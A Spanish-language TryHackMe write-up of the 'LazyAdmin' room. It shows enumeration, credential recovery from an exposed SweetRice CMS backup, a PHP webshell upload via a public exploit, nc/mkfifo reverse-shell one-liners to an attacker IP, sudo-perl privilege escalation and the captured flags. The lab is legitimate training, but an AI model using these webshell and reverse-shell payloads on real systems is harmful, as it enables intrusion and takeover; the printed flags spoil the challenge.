# LazyAdmin — TryHackMe

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat)
![Status](https://img.shields.io/badge/Status-Completed-blue?style=flat)

> **Fecha:** 25/04/2026
> **Autor:** [Josue Rendón](https://github.com/Slasho01)
> **Room:** [LazyAdmin](https://tryhackme.com/room/lazyadmin)

---

## 📋 Descripción

Room de dificultad fácil que cubre enumeración web, explotación de **SweetRice CMS 1.5.1** mediante backup disclosure y file upload, obtención de reverse shell y escalada de privilegios abusando de un script perl con permisos sudo.

---

## 🎯 Objetivos

- [x] Flag de usuario
- [x] Flag de root

---

## 🔍 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sC -sV <TARGET_IP>
```

**Resultado:**
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Puertos relevantes:**
- `22` — SSH
- `80` — HTTP, página por defecto de Apache — indica contenido en subdirectorios

---

## 🌐 2. Enumeración

### Enumeración Web — Nivel 1

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Resultado:**
```
/content    (Status: 301)
/index.html (Status: 200)
```

**Directorio de interés:** `/content`

### Enumeración Web — Nivel 2

```bash
gobuster dir -u http://<TARGET_IP>/content -w /usr/share/wordlists/dirb/common.txt
```

**Resultado:**
```
/as         (Status: 301)  → Panel de login
/attachment (Status: 301)  → Archivos subidos
/inc        (Status: 301)  → Archivos internos
/images     (Status: 301)
/js         (Status: 301)
```

### SweetRice CMS — Backup Disclosure

Accediendo a `/content/inc/mysql_backup/` se encuentra un backup de la base de datos:

```
mysql_bakup_20191129023059-1.5.1.sql
```

Se extrae información de credenciales del backup:

```bash
cat mysql_bakup_20191129023059-1.5.1.sql | grep -i admin
```

**Credenciales encontradas:**
- Usuario: `manager`
- Hash MD5: `42f749ade7f9e195bf475f37a44cafcb`

Hash crackeado en **hashes.com**:

```
42f749ade7f9e195bf475f37a44cafcb → Password123
```

---

## 💥 3. Explotación

### 3.1 File Upload — SweetRice 1.5.1

Se utiliza el exploit de Arbitrary File Upload disponible en searchsploit:

```bash
searchsploit sweetrice
searchsploit -m php/webapps/40716.py
```

Se crea la webshell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php5
```

Se ejecuta el exploit:

```bash
python3 40716.py
# URL: <TARGET_IP>/content
# Username: manager
# Password: Password123
# Filename: shell.php5
```

**Webshell disponible en:**
```
http://<TARGET_IP>/content/attachment/shell.php5
```

### 3.2 Reverse Shell

Se abre el listener:

```bash
nc -lvnp 4444
```

Se ejecuta la reverse shell desde el navegador:

```
http://<TARGET_IP>/content/attachment/shell.php5?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+<TU_IP>+4444+>/tmp/f
```

Acceso obtenido como `www-data`.

---

## 🚩 4. Flag de usuario

```bash
find / -name "user.txt" 2>/dev/null
# /home/itguy/user.txt

cat /home/itguy/user.txt
```

```
THM{63e5bce9271952aad1113b6f1ac28a07}
```

---

## ⬆️ 5. Escalada de privilegios — sudo perl

### Enumeración de sudo

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

### Análisis del script

```bash
cat /home/itguy/backup.pl
```

```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

```bash
cat /etc/copy.sh
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

> `/etc/copy.sh` tiene permisos de escritura para `www-data`. Se reemplaza la IP por la nuestra y se ejecuta el script perl como sudo para obtener root.

### Explotación

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <TU_IP> 4444 >/tmp/f' > /etc/copy.sh
```

Se abre el listener:

```bash
nc -lvnp 4444
```

Se ejecuta el script como sudo:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

```bash
whoami
# root
```

---

## 🚩 6. Flag de root

```bash
cat /root/root.txt
```

```
THM{6637f41d0177b6f37cb20d775124699f}
```

---

## 📝 7. Lecciones aprendidas

- Siempre enumerar subdirectorios en múltiples niveles — el contenido relevante raramente está en la raíz
- Los **backups expuestos** son una fuente directa de credenciales
- Los hashes MD5 sin salt son fácilmente crackeables con bases de datos online como hashes.com
- Verificar permisos de escritura en scripts ejecutados por root — `/etc/copy.sh` era escribible por `www-data`
- El patrón `sudo + script que llama a otro archivo escribible` es un vector clásico de escalada

---

## 🔗 Referencias

- [SweetRice 1.5.1 - File Upload (Exploit-DB)](https://www.exploit-db.com/exploits/40716)
- [GTFOBins — perl](https://gtfobins.github.io/gtfobins/perl/)
- [HackTricks — Web Enumeration](https://book.hacktricks.xyz/)

---

*Write-up por [Josue Rendón](https://github.com/Slasho01) · [TryHackMe Profile](https://tryhackme.com/p/Slasho01)*
